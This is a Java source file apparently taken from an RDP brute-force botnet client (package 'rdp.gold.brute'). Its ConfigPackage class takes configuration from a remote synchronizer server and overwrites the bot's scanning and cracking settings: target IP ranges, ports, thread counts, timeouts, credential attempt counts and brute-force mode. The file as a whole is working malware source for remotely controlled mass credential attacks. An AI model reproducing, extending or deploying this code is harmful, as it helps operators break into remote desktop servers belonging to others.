package rdp.gold.brute.synchronizer.packages.read;

import java.util.Map;
import java.util.Scanner;
import java.util.UUID;

import org.apache.log4j.Logger;

import rdp.gold.brute.Config;
import rdp.gold.brute.constant.BruteforceMode;
import rdp.gold.brute.synchronizer.SynchronizerInfo;
import rdp.gold.brute.synchronizer.packages.AbstractPackage;
import rdp.gold.brute.synchronizer.packages.ReadPackage;
import rdp.gold.brute.synchronizer.packages.write.BruteProjectPackage;

public class ConfigPackage extends AbstractPackage implements ReadPackage {
    @SuppressWarnings("unused")
    private final Logger logger = Logger.getLogger(getClass());

    public ConfigPackage(SynchronizerInfo synchronizerInfoObject) {
        super(synchronizerInfoObject, "ConfigPackage");
    }

    @SuppressWarnings("resource")
    public void processPacket(byte[] packet) throws Exception {
        Map<String, Object> packetMap = parsePacket(packet);
        Scanner scannerConfig = new Scanner(new String((byte[]) packetMap.get("PACKET"))).useDelimiter(";");

        boolean isUpdateConfig = scannerConfig.nextBoolean();

        if (isUpdateConfig) {
            synchronized (Config.TEST_SERVER_START_IP) {
                Config.TEST_SERVER_START_IP = scannerConfig.next();
            }

            synchronized (Config.TEST_SERVER_END_IP) {
                Config.TEST_SERVER_END_IP = scannerConfig.next();
            }

            synchronized (Config.AUTOCONFIGURE_THREADS) {
                Config.AUTOCONFIGURE_THREADS = Boolean.valueOf(scannerConfig.nextBoolean());
            }

            synchronized (Config.AUTOCONFIGURE_THREADS_CORE) {
                Integer autoconfigureThreadsCore = Config.AUTOCONFIGURE_THREADS_CORE;
                Config.AUTOCONFIGURE_THREADS_CORE = Integer.valueOf(scannerConfig.nextInt());

                if ((Config.AUTOCONFIGURE_THREADS.booleanValue()) && (Config.AUTOCONFIGURE_THREADS_CORE != autoconfigureThreadsCore)) {
                    Config.runAutoconfigureThreads();
                }
            }

            synchronized (Config.AUTOCONFIGURE_THREADS_LIMIT) {
                Integer autoconfigureThreadsLimit = Config.AUTOCONFIGURE_THREADS_LIMIT;
                Config.AUTOCONFIGURE_THREADS_LIMIT = Integer.valueOf(scannerConfig.nextInt());

                if ((Config.AUTOCONFIGURE_THREADS.booleanValue()) && (Config.AUTOCONFIGURE_THREADS_LIMIT != autoconfigureThreadsLimit)) {
                    Config.runAutoconfigureThreads();
                }
            }

            synchronized (Config.BRUTE_MODE_CHECK_SINGLE_LOGIN_PASSWORD) {
                Config.BRUTE_MODE_CHECK_SINGLE_LOGIN_PASSWORD = Boolean.valueOf(scannerConfig.nextBoolean());
            }

            synchronized (Config.BRUTE_IS_CHECK_IP) {
                Config.BRUTE_IS_CHECK_IP = Boolean.valueOf(scannerConfig.nextBoolean());
            }

            synchronized (Config.BRUTE_CNT_ATTEMPTS) {
                Config.BRUTE_CNT_ATTEMPTS = Integer.valueOf(scannerConfig.nextInt());
            }

            synchronized (Config.BRUTE_IS_LOAD_SETTINGS_FROM_SERVER) {
                Config.BRUTE_IS_LOAD_SETTINGS_FROM_SERVER = Boolean.valueOf(scannerConfig.nextBoolean());
            }

            if (Config.BRUTE_IS_LOAD_SETTINGS_FROM_SERVER.booleanValue()) {
                synchronized (Config.BRUTE_TIMEOUT) {
                    Config.BRUTE_TIMEOUT = Integer.valueOf(scannerConfig.nextInt());
                }

                Integer bruteThreads = Integer.valueOf(scannerConfig.nextInt());

                if (!Config.AUTOCONFIGURE_THREADS.booleanValue()) {
                    synchronized (Config.BRUTE_THREADS) {
                        Config.BRUTE_THREADS = bruteThreads;
                    }
                }
            } else {
                synchronized (Config.BRUTE_TIMEOUT) {
                    Config.BRUTE_TIMEOUT = Config.BRUTE_TIMEOUT_MS_SETTINGS_FILE;
                }

                synchronized (Config.BRUTE_THREADS) {
                    Config.BRUTE_THREADS = Config.BRUTE_THREADS_SETTINGS_FILE;
                }
            }

            synchronized (Config.SCAN_IS_LOAD_SETTINGS_FROM_SERVER) {
                Config.SCAN_IS_LOAD_SETTINGS_FROM_SERVER = Boolean.valueOf(scannerConfig.nextBoolean());
            }

            if (Config.SCAN_IS_LOAD_SETTINGS_FROM_SERVER.booleanValue()) {
                synchronized (Config.SCAN_CONNECT_TIMEOUT) {
                    Config.SCAN_CONNECT_TIMEOUT = Integer.valueOf(scannerConfig.nextInt());
                }

                synchronized (Config.SCAN_SOCKET_TIMEOUT) {
                    Config.SCAN_SOCKET_TIMEOUT = Integer.valueOf(scannerConfig.nextInt());
                }

                Integer scanThreads = Integer.valueOf(scannerConfig.nextInt());

                if (!Config.AUTOCONFIGURE_THREADS.booleanValue()) {
                    synchronized (Config.SCAN_THREADS) {
                        Config.SCAN_THREADS = scanThreads;
                    }
                }
            } else {
                synchronized (Config.SCAN_CONNECT_TIMEOUT) {
                    Config.SCAN_CONNECT_TIMEOUT = Config.SCAN_CONNECT_TIMEOUT_MS_SETTINGS_FILE;
                }

                synchronized (Config.SCAN_SOCKET_TIMEOUT) {
                    Config.SCAN_SOCKET_TIMEOUT = Config.SCAN_SOCKET_TIMEOUT_MS_SETTINGS_FILE;
                }

                synchronized (Config.SCAN_THREADS) {
                    Config.SCAN_THREADS = Config.SCAN_THREADS_SETTINGS_FILE;
                }
            }

            synchronized (Config.BRUTE_IS_CHECK_ALL_COMBINATIONS) {
                Config.BRUTE_IS_CHECK_ALL_COMBINATIONS = Boolean.valueOf(scannerConfig.nextBoolean());
            }

            synchronized (Config.BRUTE_IS_SAVE_NOT_SUPPORT_IP) {
                Config.BRUTE_IS_SAVE_NOT_SUPPORT_IP = Boolean.valueOf(scannerConfig.nextBoolean());
            }

            synchronized (Config.CHECKER_EXPECT_IP_FOR_ENABLE_SCAN) {
                Config.CHECKER_EXPECT_IP_FOR_ENABLE_SCAN = Integer.valueOf(scannerConfig.nextInt());
                logger.info("CHECKER_EXPECT_IP_FOR_ENABLE_SCAN -> " + Config.CHECKER_EXPECT_IP_FOR_ENABLE_SCAN);
            }

            synchronized (Config.CHECKER_EXPECT_BRUTABLE_IP_FOR_ENABLE_BRUTE) {
                Config.CHECKER_EXPECT_BRUTABLE_IP_FOR_ENABLE_BRUTE = Integer.valueOf(scannerConfig.nextInt());
            }

            synchronized (Config.PORT_SCAN) {
                Config.PORT_SCAN = scannerConfig.next();
            }

            synchronized (Config.SCAN_TYPE) {
                Config.SCAN_TYPE = Integer.valueOf(scannerConfig.nextInt());
            }

            synchronized (Config.SCAN_CNT_ATTEMPTS) {
                Config.SCAN_CNT_ATTEMPTS = Integer.valueOf(scannerConfig.nextInt());
            }

            synchronized (Config.SCAN_IS_BRUTABLE) {
                Config.SCAN_IS_BRUTABLE = Boolean.valueOf(scannerConfig.nextBoolean());
            }

            synchronized (Config.SCAN_SAVE_INVALID) {
                Config.SCAN_SAVE_INVALID = Boolean.valueOf(scannerConfig.nextBoolean());
            }

            synchronized (Config.BRUTEFORCE_MODE) {
                Config.BRUTEFORCE_MODE = BruteforceMode.valueOf(scannerConfig.next());
            }

            synchronized (Config.CONFIG_ID) {
                Config.CONFIG_ID = UUID.fromString(scannerConfig.next());
            }

        }
    }

    public Class<?> getAwaitPackage() {
        return null;
    }

    public Class<?> getWritePackage() {
        if ((Config.TYPE_TASK.get() == 1) || (Config.TYPE_TASK.get() == 2)) {
            return BruteProjectPackage.class;
        }
        return null;
    }
}
